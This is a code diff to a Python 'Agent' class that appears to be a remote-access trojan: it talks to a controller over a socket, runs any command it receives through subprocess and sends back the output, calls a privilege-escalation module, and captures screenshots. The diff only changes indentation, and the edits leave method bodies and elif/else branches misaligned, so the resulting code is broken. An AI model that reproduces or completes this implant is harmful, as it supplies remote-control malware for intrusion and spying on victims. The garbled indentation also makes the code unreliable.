@@ -78,18 +78,18 @@ class Agent:
             return None
 
     def reliable_send(self, data):
-        jsondata = json.dumps(data)
-        s.send(jsondata.encode(ENCODING))
+    jsondata = json.dumps(data)
+    s.send(jsondata.encode(ENCODING))
 
     def reliable_recv(self):
-        data = ''
-        while True:
-            try:
-                data = data + s.recv(1024).decode(ENCODING).rstrip()
-                return json.loads(data)
-            except ValueError:
-                continue
-            except socket.error:
+    data = ''
+    while True:
+        try:
+            data = data + s.recv(1024).decode(ENCODING).rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+        except socket.error:
                 raise
 
     def execute_module_function(self, module_name, function_name, *args, **kwargs):
@@ -99,7 +99,7 @@ class Agent:
             if module and hasattr(module, function_name):
                 return getattr(module, function_name)(*args, **kwargs)
             return None
-        except Exception as e:
+    except Exception as e:
             print(f"Error executing {function_name} from {module_name}: {e}")
             return None
 
@@ -130,14 +130,14 @@ class Agent:
                 result = self.execute_module_function('privilege', 'escalate')
                 self.reliable_send(result if result else '[-] Privilege escalation failed')
                 
-            elif command[:10] == 'screenshot':
+        elif command[:10] == 'screenshot':
                 screenshot = self.execute_module_function('screenshot', 'capture')
                 if screenshot:
                     self.reliable_send(screenshot)
                 else:
                     self.reliable_send('[-] Screenshot failed')
-                    
-            else:
+
+        else:
                 # Default command execution
                 try:
                     import subprocess
@@ -148,7 +148,7 @@ class Agent:
                         stderr=subprocess.PIPE,
                         stdin=subprocess.PIPE
                     )
-                    result = execute.stdout.read() + execute.stderr.read()
+            result = execute.stdout.read() + execute.stderr.read()
                     self.reliable_send(result.decode())
                 except Exception as e:
                     self.reliable_send(f"[-] Error executing command: {e}")
